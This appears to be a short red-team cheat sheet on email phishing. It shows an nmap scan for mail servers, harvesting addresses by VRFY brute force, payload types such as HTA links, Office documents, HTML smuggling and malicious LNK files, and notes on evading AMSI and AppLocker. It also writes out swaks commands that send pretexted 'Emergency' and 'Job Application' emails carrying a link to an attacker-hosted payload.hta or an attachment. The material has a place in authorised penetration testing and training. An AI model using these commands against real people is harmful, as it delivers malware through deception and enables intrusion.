# Phishing

## Email

### Target Discovery

* Find mail servers (tcp/25)
```bash
nmap -Pn -p 25 192.168.1.1
```

* Collect email address
- Bruteforce by `VRFY`
- Corporate website

### Payload Delivery
* Send email to the target with some pretext
- HTA link
- Office Documents
- HTML Smuggling
- Malicious LNK

Beware of AMSI, AppLocker and Architectures (x86/x64)

* Email with malicious HTA link
```bash
swaks --to "test@target.com" --from "test@attacker.com" --header "Subject: Emergency" --body "Please check http://192.168.1.2/payload.hta" --server 192.168.1.1
```

* Email with malicious attachment
```bash
swaks --to "test@target.com" --from "test@attacker.com" --header "Subject: Job Application" --body "Please check my CV." --server 192.168.174.201 --attach @<file>
```